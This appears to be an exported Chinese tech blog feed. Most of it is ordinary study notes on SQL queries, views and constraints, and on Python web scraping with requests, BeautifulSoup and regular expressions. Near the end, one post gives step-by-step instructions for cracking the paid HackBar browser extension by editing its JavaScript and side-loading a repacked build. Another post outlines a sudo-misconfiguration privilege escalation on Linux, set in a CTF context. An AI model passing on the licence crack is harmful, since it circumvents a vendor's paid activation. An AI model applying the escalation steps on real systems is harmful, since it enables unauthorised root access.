外连接与上面的一般连接不同，一般连接只有满足条件的元组才可以作为结果输出外连接（左，右，全外连接）可以把舍弃的元组保留在结果关系中，其他属性上填空值左连接列出左边关系所有元组，右连接列出右边关系所有元组，全则都列举例：A（）B（）内连接，既是A，又是B左，是A，可以不是B右，是B，可以不是A全，可以不是A，可以不是B 123456students(name,dept)employee(name,salary)内连接：select name,dept,salary from students inner join employee on (students.name=employee.name)左外连接: select name,dept,salary from students left outer join employee on (students.name=employee.name)右外连接：right全外连接：full SQL嵌套查询查询块 select-from-where子查询中不能使用order by语句，order by只能对最终结果进行排序 带有in的子查询不相关的子查询从里到外 带有比较运算符的子查询 带有any和all的子查询（有时候查询的名字不唯一时）某一个，所有提高搜索效率的方法：（某一个比较改为最大值比较max()）（所有比较改为最小值min()） 相关子查询exists 子查询不返回数据，只返回True，False相关子查询方法由外向里exists的优点：相对于in来说，当表数据较大时，使用exists，in()会遍历表 1234567891011select * from A where exists (select 1 from B where A.id=B.id);exists的工作原理：List resultSet=&#123;&#125;;Array A=(select * from A);for(int i=0;i&lt;A.length;i++) &#123; if(exists(A[i].id) &#123; //执行select 1 from B where B.id=A.id是否有记录返回 resultSet.add(A[i]); &#125;&#125;return resultSet; 通俗解释：将外查询表的每一行，代入内查询检验，非空可以输出，空值则舍弃 SQL分组聚集聚集操作 count(*) count(列名)sum(),avg(),max(),min() group by xxxx having 条件设置 基于派生表的查询子查询不仅可以出现在where语句中，还能出现在from子句中，子查询生成的临时派生表成为主查询的查询对象 12345678910111213求出每个学生超过他自己的课程平均分的课程号方法一：select sno,cnofrom sc xwhere grade &gt;(select avg(grade) from sc y where y.sno=x.sno)方法二：（派生表）select sno,cnofrom sc,(select sno,avg(grade) from sc group by sno as avg_sc(avg_sno,avg_grade))////或者直接括号别名where sc.sno=avg_sc.avg_snoand sc.grade&gt;=avg_sc.avg_grade 数据操作数据插入，数据删除，数据修改 数据插入insert into &lt;表&gt; &lt;列名&gt;values(‘a’,’b’,’c’)values 可以替换为select 语句 数据删除delete from &lt;表&gt; where 数据修改update &lt;表&gt; set &lt;字段&gt; where SQL视图属于外模式，视图是从一个或几个基本表导出的表 基于关系建立视图create view a as select * from students where 行列子集视图：从基本表导出，保留了码 视图的属性或者全部指定或者全部不指定 with check option 子句进行update,insert,delete要保证更新、插入、删除的行满足视图定义的谓词条件对于update，insert要保证操作过后，数据能被视图查询出来 视图删除 drop view name 视图的查询对视图的查询不能直接进行转换 视图的更新由两个以上节本表导出的视图不允许更新来自于字段表达式或常数的视图字段不允许进行insert和update操作，但允许delete操作不允许更新聚集函数视图字段不允许更新group by，distinct视图嵌套查询内层额表也是导出该视图的基本表时，不允许更新不允许更新视图上定义的视图也不允许更新 视图的作用简化用户的操作视图使用户能以多种角度看待统一数据视图可以对机密数据提供一定的安全保护视图可以帮助更清晰的表达查询视图对数据库的重构提供了一定程度的逻辑独立性 SQL的索引索引提高了select和where子句的速度，降低了update和insert语句的速度位于内模式提高查询效率b+树索引，hash索引 创建索引create index 索引名称 on 关系表名create unique index 唯一索引create cluster index 聚族索引 索引的删除drop index 索引名 索引的查询select * from table indexed by index_name where SQL数据库完整性完整性是指数据的正确性和相容性（数据类型，数据唯一性，数据实际性），防止不合语义的数据进入 定义功能实体完整性约束（primary key）分为列级约束和表级约束操作完整性约束 (foreign key … references)用户定义完整性约束（not null列值非空，unique列值唯一，check列值是否满足一个布尔表达式） 检查功能立即执行的约束：在一条语句或事务执行后立即检查延迟执行约束：延迟到整个事务执行结束后在执行检查begin transaction … commit 定义事务 控制机制违反实体完整性规则和用户定义的完整性规则的操作（拒绝执行）违反参照完整性的操作（拒绝执行or接受这个操作，同时执行一些附加的操作 参照完整性 外码是否接受空值 违约反应删除被参照关系的某一个元组on delete cascade 级联删除—参照关系外码和被参照元组中删除主码对应的元组一起删除 on delete no action 受限删除—参照关系中没有任何元组的外码和被删除的被参照关系的主码对应，才执行删除操作 on delete set null 置空删除—参照关系中被删除元组的主码值相等的外码值置为空值 修改与删除操作相同 插入参照关系（被参照关系中不存在元组的主码值与插入对应） no action修改参照关系 no action]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫笔记(⑤)]]></title>
    <url>%2F2020%2F03%2F13%2Fpython%E7%88%AC%E8%99%AB(%E2%91%A4)%2F</url>
    <content type="text"><![CDATA[爬虫实例实例①：淘宝商品定向爬虫 isinstance(object,classinfo) 函数，判断一个对象是否是一个已知的类型 object 实例对象 classinfo 类名，基本类型或其组成的元组 hasattr(object,name)函数，判断对象是否包含对应的属性 object 实例对象 name 字符串，属性名 re.S的用途：可以跨行匹配 问题：淘宝的搜索接口，翻页的处理]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫笔记(④)]]></title>
    <url>%2F2020%2F03%2F13%2Fpython%E7%88%AC%E8%99%AB(%E2%91%A3)%2F</url>
    <content type="text"><![CDATA[正则表达式正则表达式的使用： 讲字符串进行编译，编译成特征，举例： regex=’p(y|yt|yth|ytho)?n’ p=re.complie(regex) 正则表达式的常用操作符 . 表示单个字符 [ ]表示字符集[a,b,c],[a-z] [^ ]表示非字符集 *表示0次或多次拓展 +表示1次或多次拓展 ？表示0次或1次拓展 |表示左右表达式任意一个 {m}表示拓展前面一个字符m次 {m,n}拓展m-n次 ^匹配开头 ^a a开头 $ 匹配结尾 ()表示分组标记，内部只能使用 | \d 表示数字 等价于[0-9] \w 表示字符，等价于[A-Za-z0-9_] 经典的正则表达式 ^[A-Za-z0-9]+$ 数字和字母组成的字符串 ^-?\d+$ 整数形式 ^[0-9]*[1-9][0-9]*$ 正整数 [1-9]\d{5} 邮政编码 (([1-9]?\d|1\d{2}|2[0-4]\d|25[0-5]).){3}([1-9]?\d|1\d{2}|2[0-4]\d|25[0-5]) ip地址的正则表达式（0-99，100-199,200-249,250-255) re库的使用import reraw string 类型（原生字符串类型）在字符串前面加r，原生字符串中的转义符不解释re库的主要函数： re.search() 在一个字符串只搜索匹配的第一个位置，返回match对象re.search(pattern,string,flags) flag(re.I –re.IGNORECASE忽略大小写////re.M— re.MULTILINE，可以在每行的开始匹配////re.S— re.DOTALL让.匹配所有字符（默认.不能匹配换行)） re.match() 在一个字符串的开始位置匹配，返回match对象参数与re.search()相同 re.findall() 搜索字符串，返回列表类型的全部匹配 re.split() 将一个字符串按照正则表达式匹配进行分割，返回列表类型re.split(pattern,string,maxsplit=0,flags=0)maxsplit为最大分割数，剩余的作为最后一个元素输出 re.finditer() 搜索字符串，返回第一个匹配的迭代类型，返回match对象for i in re.finditer() re.sub() 在一个字符串中替换所有正则表达式的子串，返回替换后的字符串re.sub(pattern,repl,string,count=0,flags=0)repl：替换匹配字符串的字符串count：匹配的最大替换次数 regex=re.compile(pattern,flags)编译完regex可以直接调用re函数regex.match(直接输入匹配的字符串) match 对象match对象的属性 .string 待匹配的文本 .re 匹配时使用的pattern对象 .pos 搜索的开始为孩子 .endpos 搜索的结束位置match对象的方法 group(0) 获得匹配后的字符串,match对象只返回第一次匹配，可以使用finditer()方法实现 start() 匹配字符串在原始字符串的开始位置 end() 结束位置 span()返回(start(),end()) re库的贪婪和最小匹配re库默认采用贪婪匹配，返回符合条件的最长字符串获得最小匹配*?+??{m,n}?]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫笔记(③)]]></title>
    <url>%2F2020%2F03%2F12%2Fpython%E7%88%AC%E8%99%AB(%E2%91%A2)%2F</url>
    <content type="text"><![CDATA[信息的处理与爬虫实例信息的标记方法示例 处理示例：步骤：搜索标签，提取标签中的对应数据（tag处理和字典处理方法相同）tag.get(‘key’)bs对象的find_all方法(name,attrs,recursive,string,**kwargs) name 标签名检索字符串，字符或列表 attrs：标签属性值的检索，find_all(‘p’,’course’)检索 p标签，或不设置标签 recursive: 是否对子孙全部检索，默认为true string ：检索字符串.find_all()==() 爬虫实例：中国大学排名步骤：①.获得排名网络内容。②.提取过滤内容。③输出结果 12345678910111213141516171819202122232425262728293031323334import requestsfrom bs4 import BeautifulSoupimport bs4def gethtml(url): #获得网页内容 try: r=requests.get(url) r.raise_for_status r.encoding=r.apparent_encoding#转换编码 return r.text except: print(&apos;error&apos;)def fill(ulist,html): #处理网页内容 soup=BeautifulSoup(html,&apos;html.parser&apos;) for tr in soup.find(&apos;tbody&apos;).children: if isinstance(tr,bs4.element.Tag):#存在非tag标签，过滤非tag标签 tds=tr(&apos;td&apos;) ulist.append([tds[0].string,tds[1].string,tds[2].string,tds[3].string])def printinfo(ulist,num):#处理输出格式 mask=&apos;&#123;0:^10&#125;\t&#123;1:&#123;4&#125;^10&#125;\t&#123;2:^10&#125;\t&#123;3:^10&#125;&apos; print(mask.format(&apos;排名&apos;,&apos;名称&apos;,&apos;位置&apos;,&apos;分数&apos;,chr(12288))) for i in range(num): u=ulist[i] print(mask.format(u[0],u[1],u[2],u[3],chr(12288))) def main(): uinfo=[] url=&apos;http://www.zuihaodaxue.com/Greater_China_Ranking2019_0.html&apos; html=gethtml(url) fill(uinfo,html) printinfo(uinfo,20)if __name__==&apos;__main__&apos;: main()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫笔记(②)]]></title>
    <url>%2F2020%2F03%2F12%2Fpython%E7%88%AC%E8%99%AB(%E2%91%A1)%2F</url>
    <content type="text"><![CDATA[网站图片爬取示例1234567891011121314151617import requestsimport osurl=&apos;http://www.example.com/200001021.jpg&apos;root=&apos;d:/pics&apos; #设置文件存储位置path=root+url.split(&apos;/&apos;)[-1] #取图片名称try: if not os.path.exists(root): os.mkdir(root) if not os.path.exists(path): r=requests.get(url) with open(path,&apos;wb&apos;) as f: #二进制保存 f.write(r.content) print(&apos;ok&apos;) else: print(&apos;already exist&apos;)except: print(&apos;error&apos;) Beautifulsoup模块beautifulsoup模块使用： 12from bs4 importBeautifulSoupsoup = BeautifulSoup(&apos;&lt;p&gt;data&lt;/p&gt;&apos;,&apos;html.parser&apos;) 库解析器html.parserlxmlxmlhtml5lib tag标签 soup.,默认返回第一个tag name tag的名字，通过.name获取，字符串类型 attrs 标签的属性，字典形式组织，.attrs，举例，将标签元素拆解成字典 string 返回&lt;&gt;&lt;/&gt;中的字符串，格式：.string comment 返回标签内字符串的注释部分 ，中的内容，格式：.comment 遍历方式 下行遍历： .contents,子节点的列表，把所有的儿子节点放入列表.children ，子节点的迭代类型，遍历儿子节点.descendants，子孙节点的迭代类型，循环遍历子孙节点 1234for child in soup.body.children: #遍历儿子节点 print(child)for child in soup.body.descendants:#遍历子孙节点 print(child) 上行遍历.parents 节点的父标签.parents 节点的父标签的迭代类型 平行遍历 prettify()方法，将返回的内容添加’换行‘，显示更美观]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫笔记(①)]]></title>
    <url>%2F2020%2F03%2F11%2Fpython%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[python爬虫笔记记录request库：方法：request，get，head，post，put，patch，deleterequests.get(url,params=None,** kwargs)url：外链params： url额外参数，字典或字节流可选**kwargs：12个控制访问的参数 response对象属性：r.status_code : HTTP请求的返回状态，200表示连接成功，404表示失败r.text : HTTP响应内容的字符串形式，即，url对应的页面内容r.encoding: 从HTTP header中猜测的响应内容编码方式r.apparent_encoding: 从内容中分析出的响应内容编码方式（备选编码方式）r.content: HTTP响应内容的二进制形式 r.encoding：如果header中不存在charset，则认为编码为ISO‐8859‐1r.text根据r.encoding显示网页内容r.apparent_encoding：根据网页内容分析出的编码方式 可以看作是r.encoding的备选 requests异常requests.ConnectionError:网络连接错误异常，如DNS查询失败、拒绝连接等 requests.HTTPError:HTTP错误异常requests.URLRequired:URL缺失异常requests.TooManyRedirects:超过最大重定向次数，产生重定向异常requests.ConnectTimeout:连接远程服务器超时异常requests.Timeou:t请求URL超时，产生超时异常 r.raise_for_status():如果不是200，产生异常requests.HTTPError requests库的7个方法：requests.request()， requests.get()，requests.head()， requests.post()， requests.put()，requests.patch()， requests.delete(） http的六种请求方法：get,post,head,put,patch,deletepatch可以做到更新部分，对比put，节约网络带宽 方法示例：head()方法 12345&gt;&gt;&gt;r=requests.head(&apos;http://httpbin.org/get&apos;) &gt;&gt;&gt;r.headers &#123;&apos;Content‐Length&apos;: &apos;238&apos;, &apos;Access‐Control‐Allow‐Origin&apos;: &apos;\*&apos;, &apos;AccessControl‐Allow‐Credentials&apos;: &apos;true&apos;, &apos;Content‐Type&apos;: &apos;application/json&apos;, &apos;Server&apos;: &apos;nginx&apos;, &apos;Connection&apos;: &apos;keep‐alive&apos;, &apos;Date&apos;: &apos;Sat, 18 Feb 2017 12:07:44 GMT&apos;&#125; &gt;&gt;&gt;r.text &apos;&apos; post方法(post字典) 1234567&gt;&gt;&gt; payload=&#123;&apos;key1&apos;: &apos;value1&apos;,&apos;key2&apos;:&apos;value2&apos;&#125; &gt;&gt;&gt; r=requests.post(&apos;http://httpbin.org/post&apos;,data= payload)&gt;&gt;&gt; print(r.text)&gt;&gt;&gt; &#123; ... &quot;form&quot;: &#123; &quot;key2&quot;: &quot;value2&quot;, &quot;key1&quot;: &quot;value1&quot; &#125;,&#125; post方法(post字符串) 123456&gt;&gt;&gt; r=requests.post(&apos;http://httpbin.org/post&apos;,data= &apos;ABC&apos;) &gt;&gt;&gt; print(r.text) &#123; ... &quot;data&quot;: &quot;ABC&quot; &quot;form&quot;: &#123;&#125;, &#125; put方法，与post类似 requests.request(method,url,** kwargs)method : 请求方式，对应get/put/post等7种 ∙url: 拟获取页面的url链接 ∙**kwargs: 控制访问的参数，共13个 1&gt;&gt;&gt; kv=&#123;&apos;key1&apos;:&apos;value1&apos;,&apos;key2&apos;:&apos;value2&apos;&#125; &gt;&gt;&gt; r=requests.request(&apos;GET&apos;,&apos;http://python123.io/ws&apos;,params=kv) &gt;&gt;&gt; print(r.url) http://python123.io/ws?key1=value1&amp;key2=value2 ** kwargs: 控制访问的参数，均为可选项 params: 字典或字节序列，作为参数增加到url中data : 字典、字节序列或文件对象，作为Request的内容json: JSON格式的数据，作为Request的内容headers : 字典，HTTP定制头cookies:字典或cookiejar,request中的cookieauth:元组，支持http认证功能files:字典类型，传输文件timeout:设定超时时间，秒为单位proxies:字典类型，设置代理服务器allow_redirects: True/False，默认为True，重定向开关stream : True/False，默认为True，获取内容立即下载开关verify : True/False，默认为True，认证SSL证书开关cert : 本地SSL证书路径 函数参数requests.request(method,url,kwargs)requests.get(url,params=None, kwargs)requests.head(url,kwargs)requests.post(url,data=None, json=None, kwargs)requests.put(url,data=None, kwargs)requests.patch(url,data=None, kwargs)requests.delete(url,kwargs)** url: 拟更新页面的url链接 ∙ data : 字典、字节序列或文件，Request的内容 json: JSON格式的数据，Request的内容 ∙ **kwargs: 12个控制访问的参数]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hackbar破解]]></title>
    <url>%2F2020%2F01%2F19%2Fhackbar%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[hackbar插件的破解&#160;&#160; &#160; &#160;hackbar作为web安全爱好者常用的必备工具之一，集合这场用的各种小功能，但新版的hackbar却已经成为付费激活的插件，而其余复刻hackbar的插件用起来用很不舒服，所以在这里带来了火狐，谷歌两个浏览器hackbar插件的免费使用方式。 火狐浏览器的方法&#160; &#160;首先火狐插件商店里面可以搜到hackbar的复刻版max hackbar，可以直接使用。&#160; &#160;另一种方法就是使用之前并没有收费的版本，并关闭掉自动更新即可。&#160; &#160;在这里举例2.1.3版本的安装，github地址：https://github.com/Mr-xn/hackbar2.1.3 直接按照步骤安装即可，同时关闭掉自动更新。 谷歌浏览器的方法&#160; &#160;谷歌浏览器的hackbar可直接进行破解，在安装插件完成后，找到插件的安装位置，以mac举例，安装位置在user/xxx/library/Application Support/Google/Chrome/Default/Extensions win自行百度或者直接文件搜索即可。进入拓展文件夹后，自行判断哪个是hackbar安装文件，（可通过判断插件id或者观察文件图片分别），在安装文件夹js里面找到hackbar-panel.js文件，将此处的false改成true。 &#160; &#160;在修改代码后，会提示插件损坏无法正常使用。然后我们需要重新打包程序，然后再离线安装即可。&#160; &#160;步骤如下：首先打开插件界面，然后打开开发这模式，点击打包拓展程序。打包完成后在插件的根目录即可找到生成的crx后缀文件。然后我们需要将此文件后缀修改为rar，全部解压成文件夹。在浏览器拓展程序位置打开开发者模式，然后再点击加载，选择刚刚解压出的文件夹即可。]]></content>
      <categories>
        <category>插件</category>
      </categories>
      <tags>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sudo误配提权]]></title>
    <url>%2F2020%2F01%2F18%2Fsudo%E8%AF%AF%E9%85%8D%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[linux提权之sudo误配提权&#160; &#160; &#160; &#160;此文章思路来自于freebuf，可直接搜索【全程带阻：记一次授权网络攻防演练】查看 &#160; &#160; &#160; &#160;Linux提权方式有很多，例如利用内核栈溢出提权、搜寻配置文件中的明文密码、环境变量劫持高权限程序、不安全的服务、借助权能（POSIX capabilities）提权、sudo 误配、SUID 滥用等等。 &#160; &#160; &#160; &#160;今天举例sudo误配提权，此提权方式网上存在靶机JIS-CTF-VulnUpload-CTF01，sudo误配提权的一种方式为：查看 home​/ 目录是否 存在.sudo_as_admin_successful 文件，若有则可以输入当前低权账号的密码直接 sudo su 切换为 root 用户。而低权限用户的账户密码的获取可通过翻找各类配置文件获得（简易获得方式）。]]></content>
      <categories>
        <category>Linux提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
</search>
